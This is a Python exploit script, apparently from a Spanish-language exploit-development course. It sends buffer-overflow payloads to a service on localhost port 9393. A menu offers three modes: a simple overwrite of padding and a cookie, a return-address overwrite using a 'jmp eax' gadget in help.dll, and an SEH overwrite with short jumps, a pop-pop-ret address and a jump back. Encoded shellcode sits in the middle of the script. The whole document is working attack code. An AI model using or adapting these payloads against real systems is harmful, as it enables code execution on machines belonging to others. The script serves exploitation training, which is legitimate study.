import socket
from struct import pack as p
from time import sleep

banner = '''
..........$$$...........$$$............
........$$$$$...........$$$$$..........
.....$$$$$.$$$$$$$$$$$$$$$.$$$$$.......
...$$$.........................$$$.....
...$$............................$$....
...$$.......$$$$$$$$$$$$$........$$....
...$$.......$$$..................$$....
...$$.......$$$..................$$....
...$$.......$$$$$$$$$$$$$........$$....
...$$.......$$$..................$$....
...$$.......$$$..................$$....
...$$$$.....$$$$$$$$$$$$$......$$$.....
.....$$$$...................$$$$.......
........$$$$.............$$$$..........
...........$$$$.......$$$$.............
..............$$$$..$$$$...............
.................$$$$..................

          [ Exploiting.CL ]
            [ Advanced ]
'''
print banner

host = '127.0.0.1'
port = 9393

# bad:\x00 
shellcode  = 'B' * 50
shellcode += "\xbb\xc6\xfa\xf6\x9f\xda\xcf\xd9\x74\x24\xf4\x5f\x2b"
shellcode += "\xc9\xb1\x30\x83\xef\xfc\x31\x5f\x0f\x03\x5f\xc9\x18"
shellcode += "\x03\x63\x3d\x5e\xec\x9c\xbd\x3f\x64\x79\x8c\x7f\x12"
shellcode += "\x09\xbe\x4f\x50\x5f\x32\x3b\x34\x74\xc1\x49\x91\x7b"
shellcode += "\x62\xe7\xc7\xb2\x73\x54\x3b\xd4\xf7\xa7\x68\x36\xc6"
shellcode += "\x67\x7d\x37\x0f\x95\x8c\x65\xd8\xd1\x23\x9a\x6d\xaf"
shellcode += "\xff\x11\x3d\x21\x78\xc5\xf5\x40\xa9\x58\x8e\x1a\x69"
shellcode += "\x5a\x43\x17\x20\x44\x80\x12\xfa\xff\x72\xe8\xfd\x29"
shellcode += "\x4b\x11\x51\x14\x64\xe0\xab\x50\x42\x1b\xde\xa8\xb1"
shellcode += "\xa6\xd9\x6e\xc8\x7c\x6f\x75\x6a\xf6\xd7\x51\x8b\xdb"
shellcode += "\x8e\x12\x87\x90\xc5\x7d\x8b\x27\x09\xf6\xb7\xac\xac"
shellcode += "\xd9\x3e\xf6\x8a\xfd\x1b\xac\xb3\xa4\xc1\x03\xcb\xb7"
shellcode += "\xaa\xfc\x69\xb3\x46\xe8\x03\x9e\x0c\xef\x96\xa4\x62"
shellcode += "\xef\xa8\xa6\xd2\x98\x99\x2d\xbd\xdf\x25\xe4\xfa\x10"
shellcode += "\x6c\xa5\xaa\xb8\x29\x3f\xef\xa4\xc9\x95\x33\xd1\x49"
shellcode += "\x1c\xcb\x26\x51\x55\xce\x63\xd5\x85\xa2\xfc\xb0\xa9"
shellcode += "\x11\xfc\x90\xc9\xf4\x6e\x78\x0e"
shellcode += 'B' * 50

opcion = raw_input("\n 1) Run Exploit Ejemplo\n 2) Run Exploit Return\n 3) Run Exploit Seh\n\n > ")

if opcion == "1":
	padding = 'A' * 50
	cookie  = 'XXXX'

	payload = padding + cookie
	size = 800

elif opcion == "2":
	padding = 'A' * (2512-len(shellcode))
	retorno = p('<I', 0x62601453) # jmp eax help.dll
	relleno = 'C' * 150

	payload = shellcode + padding + retorno + relleno
	size = 680

elif opcion == "3":
	padding   = 'A' * (1820-len(shellcode))
	nhandler  = "\x71\x0B" # jno short 0xb
	nhandler += "\x70\x0B" # jo short 0xb
	handle    = p('<I', 0x6260145E) # ppr help.dll
	jmpback   = 'B' * 10 + '\xE9\xC5\xFE\xFF\xFF' + 'B' * 10

	payload = padding + shellcode + nhandler + handle + jmpback + 'D' * 3000
	size = 680

else:
	print " \n [-] Opcion invalida..."

try:
	print '\n [-] Payload Size: {}'.format(len(payload))
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((host, port))
	client.send(payload + '\n')
	sleep(1)
	print client.recv(size)
	client.close()
except:
	print ' [-] Conexion fallida'